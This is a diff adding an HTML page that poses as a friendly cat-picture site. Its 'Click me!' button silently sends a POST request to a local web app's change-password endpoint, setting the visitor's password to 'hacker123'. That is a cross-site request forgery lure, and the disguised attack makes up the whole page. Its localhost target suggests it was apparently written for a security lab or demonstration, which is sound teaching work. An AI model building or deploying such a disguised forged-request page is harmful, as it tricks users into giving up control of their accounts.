@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>you friendly cat</title>
+</head>
+<body>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<img src="static/cat1.jpg" alt="Cute Cat">
+<br>
+<h3>Trust me im a cute cat</h3>
+<br>
+<h3>do you want more cute cats pictures ?</h3>
+
+<button onclick=submit()>Click me!</button>
+<script>
+function submit() {
+    var myData = "hacker123";
+    $.post("http://localhost:5000/change-password", {"password": myData})
+}
+</script>
+
+
+</body>
+</html>
